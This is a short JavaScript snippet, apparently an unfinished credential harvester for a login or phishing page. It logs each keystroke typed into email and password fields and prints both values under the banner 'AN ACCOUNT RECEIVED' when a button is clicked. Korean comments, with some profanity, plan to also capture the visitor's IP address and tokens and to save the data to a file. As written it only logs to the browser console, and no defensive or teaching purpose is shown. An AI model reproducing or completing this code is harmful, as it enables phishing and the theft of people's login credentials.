let input = document.querySelector('input');
let email = document.getElementById("getEmail");
let password = document.getElementById("getPassword");
let button = document.getElementById("blueButton");

var cDate = new Date();
var ms = cDate.getMilliseconds();

input.addEventListener('input', updateValue);
function updateValue(e) {
 if (email) {
   console.log(`(INPUT) - [EMAIL]: ` + e.target.value);
 }
}

password.oninput = function(event) {
  console.log(`(INPUT) - [PASSCODE]: ` + password.value);
}

button.addEventListener('click', bButton); 
function bButton() {
  console.warn('===== AN ACCOUNT RECEIVED =====');
  console.warn(`(CONFIRMED) - [EMAIL]: ` + email.value);
  console.warn(`(CONFIRMED) - [PASSCODE]: ` + password.value);
  //console.warn(`(CONFIRMED) - [IP_ADRESS]: ` + ipadress);
}




//버튼 클릭시 - 저장된 이메일과 패스워드 획득
//콘솔창 출력은 숫자와 함께 중간중간 ip 추가 획득
//블루 버튼 클릭시 아이피 따기
//토큰 자료 따로 출력
//콘솔 로그 외 따로 내부 파일 저장으로?
//tlqkf 이거 파일 세이브 어케함
//힝구링퐁구링 tlqkf
